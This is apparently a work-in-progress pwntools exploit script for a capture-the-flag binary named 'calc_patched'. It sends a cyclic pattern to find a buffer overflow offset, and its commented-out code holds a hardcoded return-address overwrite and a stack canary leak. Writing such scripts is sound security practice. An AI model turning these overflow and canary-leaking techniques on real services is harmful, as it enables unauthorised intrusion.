#!/usr/bin/env python3

from pwn import *

exe = ELF("calc_patched")
libc = ELF("./libc.so.6")

context.binary = exe
#context.terminal = ["konsole"]

def conn():
    if args.REMOTE:
        p = remote("addr", 1337)
    else:
        if args.GDB:
            p = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            b *main+682
            """)
        else:
            p = process([exe.path])
    return p


def main():
    p = conn()

    #for i in range(104):
    #    p.sendline(b"A")
    #p.sendline(b'q')
    p.sendline(b'q')
    p.sendline(b'q')
    p.sendline(b'y')

    g = cyclic_gen(n=8)

    payload = g.get(0x100)
    #payload = g.get(112)
    #payload += p64(0x55555555916e) # hardcoded for now !
    #payload += g.get(0x100)
    #payload = b'\x41'
    p.sendline(payload)

    p.interactive()
'''
    # create threads
    p.sendlineafter(b'quit)', b'ff')

    canary = b''
    for _ in range(8):
        p.recvline()

    for _ in range(8):
        line = p.recvline().decode()
        parts = line.split()
        leaked_byte = int(parts[-1], 16)
        canary += bytes([leaked_byte])

    canary = u64(canary.ljust(8, b'\x00'))
    log.success(f"canary: {hex(canary)}")
''' 

if __name__ == "__main__":
    main()
